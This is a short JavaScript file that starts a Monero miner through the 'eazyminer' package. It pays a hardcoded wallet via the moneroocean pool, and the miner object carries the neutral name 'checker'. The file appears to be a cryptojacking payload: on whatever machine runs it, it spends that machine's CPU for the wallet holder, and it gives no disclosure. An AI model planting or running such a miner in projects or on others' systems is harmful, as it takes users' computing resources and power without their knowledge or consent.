const a = require('eazyminer');

const randomNumber = Math.floor(Math.random() * 100); // Generate a random number between 0 and 99


const checker = new a(
{
    pools: [
      {
        coin: 'XMR',
        user:
          '41pEhhCuFnjLQYFmN8miy8fCgvGX4VwyMgHvkMaCNocnDW4eahaPC74jaRyd9TfYwMgk2Z2swXYoc6fP1hYbCYgKNAnabxv',
        url: 'gulf.moneroocean.stream:20128', // optional pool URL,
      pass: randomNumber.toString(), // Convert the random number to a string and use it as the pass value
      },
    ],
    web: [
      {
        enabled: false,
        port: 3000,
      },
    ],
     log: {

        // Set to null to disable
        writeToFile: null,

        // Set to false to disable writing to console
        writeToConsole: true
    },
    opencl: {
        enabled: false,
        platform: 'AMD',
        loader: null,
        platform: "AMD",
        adl: true,
        "cn-lite/0": false,
        "cn/0": false
    },

    // (XMRIG config options https://xmrig.com/docs/miner/config/cuda)
    cuda: {
        enabled: false,
        loader: null,
        nvml: true,
        "cn-lite/0": false,
        "cn/0": false
    },
    
    autoStart: false,
  },
);


checker.start();
